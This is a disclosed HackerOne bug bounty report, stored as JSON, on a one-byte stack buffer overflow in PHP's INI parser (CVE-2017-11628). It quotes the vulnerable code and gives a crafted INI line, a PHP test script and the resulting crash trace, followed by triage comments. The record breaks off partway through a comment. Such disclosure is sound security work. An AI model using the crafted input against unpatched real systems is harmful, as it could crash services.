{"id":248601,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDg2MDE=","url":"https://hackerone.com/reports/248601","title":"PHP INI Parsing Stack Buffer Overflow Vulnerability","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-07-12T09:21:09.097Z","submitted_at":"2017-07-12T09:21:09.097Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"xixabangm4","url":"/xixabangm4","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-11628"],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-14T04:35:45.029Z","bug_reporter_agreed_on_going_public_at":"2019-10-14T04:35:44.961Z","team_member_agreed_on_going_public_at":"2019-10-13T09:19:05.907Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Description:\n\nA stack buffer overflow exists in the latest stable release of PHP-7.1.5 and PHP-5.6.30 in PHP INI parsing API, which may accept network / local filesystem input. On malformed inputs, a stack buffer overflow in zend_ini_do_op() could write 1-byte off a fixed size stack buffer. On installations with the stack smashing mitigation, this would cause an immediate DoS; upto optimization levels, build options and stack buffer overflow mitigations, this vulnerability may allow corrupting other local variables or the frame pointer, potentially allows remotely executing code.\n\n### Impact:\n\nAffects 32-bit builds of PHP 5 before 5.6.31 ([ChangeLog](http://php.net/ChangeLog-5.php)) and PHP 7 before 7.1.7 ([ChangeLog](http://php.net/ChangeLog-7.php)).\nResolved PHP [bug report](https://bugs.php.net/bug.php?id=74603), will update the pending CVE.\n\n### Exploitability:\n\nIf the specific build affected has built-in stack smashing mitigation, an immediate DoS can be expected. If no such mitigation in place, it is possible to overwrite one byte of the adjacent variable on stack, or the stack frame pointer, depending on compiler optimizations. The issue can be triggered via a crafted .ini file (not limited to php.ini - which is usually protected), an INI string that gets passed into parse_ini_string(), or the command-line option for INI string (not really a valid attack vector except for demonstration).\n\nIn php-7.1.5/Zend/zend_long.h:\n```\n110 #if SIZEOF_ZEND_LONG == 4\n111 # define MAX_LENGTH_OF_LONG 11\n112 # define LONG_MIN_DIGITS \"2147483648\"\n113 #elif SIZEOF_ZEND_LONG == 8\n114 # define MAX_LENGTH_OF_LONG 20\n115 # define LONG_MIN_DIGITS \"9223372036854775808\"\n116 #else\n117 # error \"Unknown SIZEOF_ZEND_LONG\"\n118 #endif\n```\nIn php-7.1.5/Zend/zend_ini_parser.c:\n```\n 123 /* {{{ zend_ini_do_op()\n 124 */\n 125 static void zend_ini_do_op(char type, zval *result, zval *op1, zval *op2)\n 126 {\n 127         int i_result;\n 128         int i_op1, i_op2;\n 129         int str_len;\n 130         char str_result[MAX_LENGTH_OF_LONG];\n 131 \n 132         i_op1 = atoi(Z_STRVAL_P(op1));\n 133         zend_string_free(Z_STR_P(op1));\n 134         if (op2) {\n 135                 i_op2 = atoi(Z_STRVAL_P(op2));\n 136                 zend_string_free(Z_STR_P(op2));\n 137         } else {\n 138                 i_op2 = 0;\n 139         }\n 140 \n 141         switch (type) {\n 142                 case '|':\n 143                         i_result = i_op1 | i_op2;\n 144                         break;\n 145                 case '\u0026':\n 146                         i_result = i_op1 \u0026 i_op2;\n 147                         break;\n 148                 case '^':\n 149                         i_result = i_op1 ^ i_op2;\n 150                         break;\n 151                 case '~':\n 152                         i_result = ~i_op1;\n 153                         break;\n 154                 case '!':\n 155                         i_result = !i_op1;\n 156                         break;\n 157                 default:\n 158                         i_result = 0;\n 159                         break;\n 160         }\n 161 \n 162         str_len = zend_sprintf(str_result, \"%d\", i_result);\n 163         ZVAL_NEW_STR(result, zend_string_init(str_result, str_len, ZEND_SYSTEM_INI));\n 164 }\n 165 /* }}} */\n```\nThe minimums, \"-2147483648\" and \"-9223372036854775808\" are of length 11 and 20 respectively, \nthe proper definition of str_result[] array would be: str_result[MAX_LENGTH_OF_LONG + 1]. A\ncrafted ini entry would cause an overflow.\n\nTest script:\n```\n$ cat input.ini\n0=0\u0026~2000000000\n\n$ cat input.php\n\u003c?php \n\n$argc = $_SERVER['argc'];\n$argv = $_SERVER['argv'];\n\n$file_loc = dirname(__FILE__).\"/\".$argv[1];\n\nvar_dump(parse_ini_file($file_loc, true, INI_SCANNER_NORMAL));\n\n?\u003e\n```\nTo reproduce:\n```\n$ bin/php input.php input.ini\n\n*** buffer overflow detected ***: bin/php terminated\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x68e4e)[0xb7527e4e]\n/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x6b)[0xb75ba85b]\n/lib/i386-linux-gnu/libc.so.6(+0xfa6ea)[0xb75b96ea]\n/lib/i386-linux-gnu/libc.so.6(+0xf9e48)[0xb75b8e48]\n/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x8e)[0xb752fc0e]\n/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x89b)[0xb7502f3b]\n/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xb1)[0xb75b8f01]\n/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xb75b8e2f]\nbin/php[0x82e7aa0]\nbin/php[0x82e87d3]\nbin/php(zend_parse_ini_file+0x47)[0x82e8b07]\nbin/php[0x8255788]\nbin/php[0x83631f6]\nbin/php(execute_ex+0x22)[0x8353c52]\nbin/php(zend_execute+0x13b)[0x83a341b]\nbin/php(zend_execute_scripts+0x30)[0x8313010]\nbin/php(php_execute_script+0x286)[0x82b3f26]\nbin/php[0x83a57de]\nbin/php[0x80683b9]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb74d8a83]\nbin/php[0x8068444]\n======= Memory map: ========\n08048000-0888d000 r-xp 00000000 08:01 704181     /home/weilei/php7_gdb/bin/php\n0888d000-0888e000 r--p 00844000 08:01 704181     /home/weilei/php7_gdb/bin/php\n0888e000-08899000 rw-p 00845000 08:01 704181     /home/weilei/php7_gdb/bin/php\n08899000-088b2000 rw-p 00000000 00:00 0 \n09ae7000-09b9a000 rw-p 00000000 00:00 0          [heap]\nb7000000-b7200000 r--p 00000000 08:01 271314     /usr/lib/locale/locale-archive\nb7200000-b7400000 rw-p 00000000 00:00 0 \nb7464000-b7480000 r-xp 00000000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1\nb7480000-b7481000 rw-p 0001b000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1\nb7496000-b74bf000 rw-p 00000000 00:00 0 \nb74bf000-b7667000 r-xp 00000000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb7667000-b7669000 r--p 001a8000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb7669000-b766a000 rw-p 001aa000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb766a000-b766d000 rw-p 00000000 00:00 0 \nb766d000-b7670000 r-xp 00000000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7670000-b7671000 r--p 00002000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7671000-b7672000 rw-p 00003000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7672000-b7673000 rw-p 00000000 00:00 0 \nb7673000-b76b7000 r-xp 00000000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b7000-b76b8000 r--p 00043000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b8000-b76b9000 rw-p 00044000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b9000-b76cc000 r-xp 00000000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cc000-b76cd000 ---p 00013000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cd000-b76ce000 r--p 00013000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76ce000-b76cf000 rw-p 00014000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cf000-b76e4000 rw-p 00000000 00:00 0 \nb76e4000-b76e5000 r--s 00000000 08:01 554280     /home/weilei/php7_gdb/input.ini\nb76e5000-b76e6000 r--p 00855000 08:01 271314     /usr/lib/locale/locale-archive\nb76e6000-b76e8000 rw-p 00000000 00:00 0 \nb76e8000-b76ea000 r--p 00000000 00:00 0          [vvar]\nb76ea000-b76ec000 r-xp 00000000 00:00 0          [vdso]\nb76ec000-b770c000 r-xp 00000000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nb770c000-b770d000 r--p 0001f000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nb770d000-b770e000 rw-p 00020000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nbff25000-bff47000 rw-p 00000000 00:00 0          [stack]\nAborted\n```\n","vulnerability_information_html":"\u003ch3 id=\"description\"\u003eDescription:\u003c/h3\u003e\n\n\u003cp\u003eA stack buffer overflow exists in the latest stable release of PHP-7.1.5 and PHP-5.6.30 in PHP INI parsing API, which may accept network / local filesystem input. On malformed inputs, a stack buffer overflow in zend_ini_do_op() could write 1-byte off a fixed size stack buffer. On installations with the stack smashing mitigation, this would cause an immediate DoS; upto optimization levels, build options and stack buffer overflow mitigations, this vulnerability may allow corrupting other local variables or the frame pointer, potentially allows remotely executing code.\u003c/p\u003e\n\n\u003ch3 id=\"impact\"\u003eImpact:\u003c/h3\u003e\n\n\u003cp\u003eAffects 32-bit builds of PHP 5 before 5.6.31 (\u003ca href=\"/redirect?url=http%3A%2F%2Fphp.net%2FChangeLog-5.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eChangeLog\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and PHP 7 before 7.1.7 (\u003ca href=\"/redirect?url=http%3A%2F%2Fphp.net%2FChangeLog-7.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eChangeLog\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003cbr\u003e\nResolved PHP \u003ca href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D74603\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ebug report\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, will update the pending CVE.\u003c/p\u003e\n\n\u003ch3 id=\"exploitability\"\u003eExploitability:\u003c/h3\u003e\n\n\u003cp\u003eIf the specific build affected has built-in stack smashing mitigation, an immediate DoS can be expected. If no such mitigation in place, it is possible to overwrite one byte of the adjacent variable on stack, or the stack frame pointer, depending on compiler optimizations. The issue can be triggered via a crafted .ini file (not limited to php.ini - which is usually protected), an INI string that gets passed into parse_ini_string(), or the command-line option for INI string (not really a valid attack vector except for demonstration).\u003c/p\u003e\n\n\u003cp\u003eIn php-7.1.5/Zend/zend_long.h:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e110 #if SIZEOF_ZEND_LONG == 4\n111 # define MAX_LENGTH_OF_LONG 11\n112 # define LONG_MIN_DIGITS \u0026quot;2147483648\u0026quot;\n113 #elif SIZEOF_ZEND_LONG == 8\n114 # define MAX_LENGTH_OF_LONG 20\n115 # define LONG_MIN_DIGITS \u0026quot;9223372036854775808\u0026quot;\n116 #else\n117 # error \u0026quot;Unknown SIZEOF_ZEND_LONG\u0026quot;\n118 #endif\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn php-7.1.5/Zend/zend_ini_parser.c:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e 123 /* {{{ zend_ini_do_op()\n 124 */\n 125 static void zend_ini_do_op(char type, zval *result, zval *op1, zval *op2)\n 126 {\n 127         int i_result;\n 128         int i_op1, i_op2;\n 129         int str_len;\n 130         char str_result[MAX_LENGTH_OF_LONG];\n 131 \n 132         i_op1 = atoi(Z_STRVAL_P(op1));\n 133         zend_string_free(Z_STR_P(op1));\n 134         if (op2) {\n 135                 i_op2 = atoi(Z_STRVAL_P(op2));\n 136                 zend_string_free(Z_STR_P(op2));\n 137         } else {\n 138                 i_op2 = 0;\n 139         }\n 140 \n 141         switch (type) {\n 142                 case \u0026#39;|\u0026#39;:\n 143                         i_result = i_op1 | i_op2;\n 144                         break;\n 145                 case \u0026#39;\u0026amp;\u0026#39;:\n 146                         i_result = i_op1 \u0026amp; i_op2;\n 147                         break;\n 148                 case \u0026#39;^\u0026#39;:\n 149                         i_result = i_op1 ^ i_op2;\n 150                         break;\n 151                 case \u0026#39;~\u0026#39;:\n 152                         i_result = ~i_op1;\n 153                         break;\n 154                 case \u0026#39;!\u0026#39;:\n 155                         i_result = !i_op1;\n 156                         break;\n 157                 default:\n 158                         i_result = 0;\n 159                         break;\n 160         }\n 161 \n 162         str_len = zend_sprintf(str_result, \u0026quot;%d\u0026quot;, i_result);\n 163         ZVAL_NEW_STR(result, zend_string_init(str_result, str_len, ZEND_SYSTEM_INI));\n 164 }\n 165 /* }}} */\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe minimums, \u0026quot;-2147483648\u0026quot; and \u0026quot;-9223372036854775808\u0026quot; are of length 11 and 20 respectively, \u003cbr\u003e\nthe proper definition of str_result[] array would be: str_result[MAX_LENGTH_OF_LONG + 1]. A\u003cbr\u003e\ncrafted ini entry would cause an overflow.\u003c/p\u003e\n\n\u003cp\u003eTest script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eini\u003c/span\u003e\n\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;~\u003c/span\u003e\u003cspan class=\"mi\"\u003e2000000000\u003c/span\u003e\n\n\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \n\n\u003cspan class=\"nv\"\u003e$argc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;argc\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$argv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;argv\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$file_loc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edirname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003e__FILE__\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$argv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eparse_ini_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$file_loc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eINI_SCANNER_NORMAL\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo reproduce:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ bin/php input.php input.ini\n\n*** buffer overflow detected ***: bin/php terminated\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x68e4e)[0xb7527e4e]\n/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x6b)[0xb75ba85b]\n/lib/i386-linux-gnu/libc.so.6(+0xfa6ea)[0xb75b96ea]\n/lib/i386-linux-gnu/libc.so.6(+0xf9e48)[0xb75b8e48]\n/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x8e)[0xb752fc0e]\n/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x89b)[0xb7502f3b]\n/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xb1)[0xb75b8f01]\n/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xb75b8e2f]\nbin/php[0x82e7aa0]\nbin/php[0x82e87d3]\nbin/php(zend_parse_ini_file+0x47)[0x82e8b07]\nbin/php[0x8255788]\nbin/php[0x83631f6]\nbin/php(execute_ex+0x22)[0x8353c52]\nbin/php(zend_execute+0x13b)[0x83a341b]\nbin/php(zend_execute_scripts+0x30)[0x8313010]\nbin/php(php_execute_script+0x286)[0x82b3f26]\nbin/php[0x83a57de]\nbin/php[0x80683b9]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb74d8a83]\nbin/php[0x8068444]\n======= Memory map: ========\n08048000-0888d000 r-xp 00000000 08:01 704181     /home/weilei/php7_gdb/bin/php\n0888d000-0888e000 r--p 00844000 08:01 704181     /home/weilei/php7_gdb/bin/php\n0888e000-08899000 rw-p 00845000 08:01 704181     /home/weilei/php7_gdb/bin/php\n08899000-088b2000 rw-p 00000000 00:00 0 \n09ae7000-09b9a000 rw-p 00000000 00:00 0          [heap]\nb7000000-b7200000 r--p 00000000 08:01 271314     /usr/lib/locale/locale-archive\nb7200000-b7400000 rw-p 00000000 00:00 0 \nb7464000-b7480000 r-xp 00000000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1\nb7480000-b7481000 rw-p 0001b000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1\nb7496000-b74bf000 rw-p 00000000 00:00 0 \nb74bf000-b7667000 r-xp 00000000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb7667000-b7669000 r--p 001a8000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb7669000-b766a000 rw-p 001aa000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb766a000-b766d000 rw-p 00000000 00:00 0 \nb766d000-b7670000 r-xp 00000000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7670000-b7671000 r--p 00002000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7671000-b7672000 rw-p 00003000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7672000-b7673000 rw-p 00000000 00:00 0 \nb7673000-b76b7000 r-xp 00000000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b7000-b76b8000 r--p 00043000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b8000-b76b9000 rw-p 00044000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b9000-b76cc000 r-xp 00000000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cc000-b76cd000 ---p 00013000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cd000-b76ce000 r--p 00013000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76ce000-b76cf000 rw-p 00014000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cf000-b76e4000 rw-p 00000000 00:00 0 \nb76e4000-b76e5000 r--s 00000000 08:01 554280     /home/weilei/php7_gdb/input.ini\nb76e5000-b76e6000 r--p 00855000 08:01 271314     /usr/lib/locale/locale-archive\nb76e6000-b76e8000 rw-p 00000000 00:00 0 \nb76e8000-b76ea000 r--p 00000000 00:00 0          [vvar]\nb76ea000-b76ec000 r-xp 00000000 00:00 0          [vdso]\nb76ec000-b770c000 r-xp 00000000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nb770c000-b770d000 r--p 0001f000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nb770d000-b770e000 rw-p 00020000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nbff25000-bff47000 rw-p 00000000 00:00 0          [stack]\nAborted\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":3,"name":"Classic Buffer Overflow"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:19:06.022Z","allow_singular_disclosure_after":-35668329.21764838,"singular_disclosure_allowed":true,"vote_count":2,"voters":["smodnix","japz"],"severity":{"rating":"medium","score":6.8,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1827630,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is a fun finding!\n\nA bit unusual from a severity assessment given the prerequisites involved. Pardon my ignorance, but have you encountered examples of widespread frameworks / applications that utilize `.ini` parsing for user input?","markdown_message":"\u003cp\u003eThis is a fun finding!\u003c/p\u003e\n\n\u003cp\u003eA bit unusual from a severity assessment given the prerequisites involved. Pardon my ignorance, but have you encountered examples of widespread frameworks / applications that utilize \u003ccode\u003e.ini\u003c/code\u003e parsing for user input?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-12T09:27:06.466Z","updated_at":"2017-07-12T09:27:06.466Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1827726,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Not yet at the moment.. this observation is mainly based on the following:\n\nPHP has exported both parse_ini_file() and parse_ini_string() as standard APIs at developers' disposal without informing potential issues - they may take external network data, or local ini files/strings that do not receive the same level of protection of php.ini. This allows a potential security boundary cross.","markdown_message":"\u003cp\u003eNot yet at the moment.. this observation is mainly based on the following:\u003c/p\u003e\n\n\u003cp\u003ePHP has exported both parse_ini_file() and parse_ini_string() as standard APIs at developers\u0026#39; disposal without informing potential issues - they may take external network data, or local ini files/strings that do not receive the same level of protection of php.ini. This allows a potential security boundary cross.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-12T09:57:49.554Z","updated_at":"2017-07-12T09:57:49.554Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1831418,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"After a brief search:\n\n1. Use of parse_ini_file():\nhttps://searchcode.com/?q=lang%3Aphp%20parse_ini_file%20source%3AGithub\u0026p=0\u0026loc=0\u0026loc2=10000\n\n2. Use of parse_ini_string():\nhttps://searchcode.com/?q=lang%3Aphp%20parse_ini_string%20source%3AGithub\u0026p=0\u0026loc=0\u0026loc2=10000\n\nMost of them seems from static settings, but due to the vast variety of sources of subject data, it may be possible to control some in the local FS or environment variables.","markdown_message":"\u003cp\u003eAfter a brief search:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eUse of parse_ini_file():\u003cbr\u003e\n\u003ca title=\"https://searchcode.com/?q=lang%3Aphp%20parse_ini_file%20source%3AGithub\u0026amp;p=0\u0026amp;loc=0\u0026amp;loc2=10000\" href=\"/redirect?url=https%3A%2F%2Fsearchcode.com%2F%3Fq%3Dlang%253Aphp%2520parse_ini_file%2520source%253AGithub%26p%3D0%26loc%3D0%26loc2%3D10000\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://searchcode.com/?q=lang%3Aphp%20parse_ini_file%20source%3AGithub\u0026amp;p=0\u0026amp;loc=0\u0026amp;loc2=10000\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUse of parse_ini_string():\u003cbr\u003e\n\u003ca title=\"https://searchcode.com/?q=lang%3Aphp%20parse_ini_string%20source%3AGithub\u0026amp;p=0\u0026amp;loc=0\u0026amp;loc2=10000\" href=\"/redirect?url=https%3A%2F%2Fsearchcode.com%2F%3Fq%3Dlang%253Aphp%2520parse_ini_string%2520source%253AGithub%26p%3D0%26loc%3D0%26loc2%3D10000\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://searchcode.com/?q=lang%3Aphp%20parse_ini_string%20source%3AGithub\u0026amp;p=0\u0026amp;loc=0\u0026amp;loc2=10000\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eMost of them seems from static settings, but due to the vast variety of sources of subject data, it may be possible to control some in the local FS or environment variables.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-13T07:49:41.232Z","updated_at":"2017-07-13T07:49:41.232Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1867328,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE-2017-11628 has been assigned for this issue:\nhttps://nvd.nist.gov/vuln/detail/CVE-2017-11628","markdown_message":"\u003cp\u003eCVE-2017-11628 has been assigned for this issue:\u003cbr\u003e\n\u003ca title=\"https://nvd.nist.gov/vuln/detail/CVE-2017-11628\" href=\"/redirect?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2017-11628\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nvd.nist.gov/vuln/detail/CVE-2017-11628\u003c/span\u003e\u003ci 